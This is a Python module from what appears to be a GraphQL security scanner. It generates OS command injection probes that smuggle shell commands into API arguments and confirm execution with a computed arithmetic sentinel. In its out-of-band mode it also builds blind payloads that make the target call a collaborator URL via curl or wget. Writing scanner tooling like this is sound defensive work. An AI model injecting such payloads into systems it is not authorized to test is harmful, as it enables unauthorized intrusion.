"""OS command injection family.

Confirmation uses a **computed** sentinel — the result of arithmetic the shell
must evaluate (``$((A*B))`` / ``expr A \\* B``) — never a literal token. A server
that merely echoes the payload back reflects the *expression* but cannot produce
the *product*, so reflection can never be mistaken for execution.
"""

from __future__ import annotations

from prediql.oracle.evidence import Evidence, Expectation
from prediql.security.families.base import (
    Payload,
    ProbeFamily,
    injectable_arguments,
    unique_token,
)
from prediql.model.schema import Operation, Schema

# Two distinct primes; their product appears nowhere in the payload text.
_A, _B = 91_273, 7
_PRODUCT = str(_A * _B)

# Shell metacharacters that break out of a command context, each computing the
# same product so one sentinel confirms any of them.
_TEMPLATES = (
    "; echo $(({a}*{b}))",
    "| echo $(({a}*{b}))",
    "$(expr {a} \\* {b})",
    "`expr {a} \\* {b}`",
    "& echo $(({a}*{b}))",
)


class OsCommandInjectionFamily(ProbeFamily):
    id = "os_command_injection"

    def seed_payloads(self, operation: Operation, schema: Schema) -> list[Payload]:
        payloads: list[Payload] = []
        for argument in self.injectable(operation, schema):
            marker = unique_token()  # to still detect plain reflection as a signal
            for template in _TEMPLATES:
                value = f"{marker}{template.format(a=_A, b=_B)}"
                payloads.append(self._inject(
                    operation, schema, argument, value,
                    Expectation(self.id, Evidence.SENTINEL, sentinel=_PRODUCT,
                                marker=marker, stage="command-exec"),
                ))
            # Blind execution: no product in the response, but the shell reaches
            # our collaborator. Only emitted when an OOB server is configured.
            if self.oob is not None:
                token = self.oob.new_token()
                url = self.oob.url_for(token)
                for inj in (f"; curl -s {url}", f"; wget -qO- {url}", f"$(curl -s {url})"):
                    payloads.append(self._inject(
                        operation, schema, argument, inj,
                        Expectation(self.id, Evidence.CALLBACK, token=token,
                                    marker=inj, stage="command-exec-oob"),
                    ))
        return payloads
